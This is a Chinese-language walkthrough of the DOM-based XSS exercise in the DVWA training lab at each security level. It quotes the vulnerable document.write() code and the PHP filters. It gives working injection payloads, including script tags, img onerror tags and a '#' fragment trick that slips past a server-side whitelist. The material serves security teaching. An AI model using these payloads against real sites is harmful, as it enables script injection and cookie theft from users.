> DOM XSS 关键点：** 漏洞发生在浏览器前端 JS，后端 PHP 不输出恶意内容；JS 读取 URL 里`default`参数，用`document.write()`直接写进页面 HTML，造成注入CSDN博...。
> 前端核心 JS 代码：

```
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
}
```

>
> 它直接截取浏览器地址栏`default=`后面全部内容，**服务器接收不到 #后面的锚点内容**（# 片段不会发给 web 服务器）。

---

## Low 级别

后端 PHP 无任何过滤，直接把 URL 参数交给前端 JS 处理。

### Payload 方式 1（直接注入 script）

```
?vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```

完整 URL 示例：

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

### Payload 方式 2：闭合标签逃逸

select 下拉框内部不能直接渲染 img，需要闭合`</option></select>`跳出下拉框：

```
?vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(1)>
```

>
> 原理：JS 把我们的字符串直接拼进 HTML，闭合原有标签，注入新标签执行 JS。

---

## Medium 级别

后端源码：

```
if (stripos ($default, "<script") !== false) {
    header ("location: ?default=English");
    exit;
}
```

后端**黑名单过滤`<script`（大小写不敏感）**，只要参数带`<script`就直接重定向到 English，`<script>`标签不能用，但其他事件标签不受限制。

✅可用 payload（不用 script 标签，用事件 onerror/onmouseover）

```
?vulnerabilities/xss_d/?default=</option></select><img src=x onerror=alert(1)>
```

或者鼠标悬浮触发：

```
?vulnerabilities/xss_d/?default=English'onmouseover='alert(1)'
```

>
> 注意：`<script>`全部被拦截，不要写 script 标签，使用 img/svg/body 事件。

---

## High 级别

后端源码：PHP 做**白名单**，只允许`English / French / German / Spanish`这 4 个值，其他值服务器直接 302 重定向跳回`?default=English`。

```
switch ($_GET['default']) {
    case "French":
    case "English":
    case "German":
    case "Spanish":
        break;
    default:
        header ("location: ?default=English");
        exit;
}
```

### 核心绕过思路

URL 中`#`锚点后面的内容**不会发送到后端 PHP 服务器**！

- PHP 拿到的参数：`default=English`（白名单合法，不会重定向）
- 浏览器 JS 读取完整`location.href`，会读到`#`后面我们写的恶意 payload，前端 JS 解析执行，后端完全看不到 #后的内容。

✅ High 可用 payload：

```
?vulnerabilities/xss_d/?default=English#</option></select><img src=x onerror=alert(1)>
```

完整 URL：

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/xss_d/?default=English#</option></select><img src=x onerror=alert(1)>
```

>
> 浏览器访问这个链接，**不要 URL 编码 #号**，# 必须原样保留。
> 后端 PHP 接收到`default=English`，符合白名单；前端 JS 截取`default=`之后全部内容，包含`#`以及后面的注入代码，触发 DOM‑XSS。

---

## Impossible 级别

后端不再把参数交给前端 JS 拼接，直接 PHP 输出下拉选项，使用`htmlspecialchars()`做 HTML 转义，没有 DOM‑XSS 漏洞，无法攻击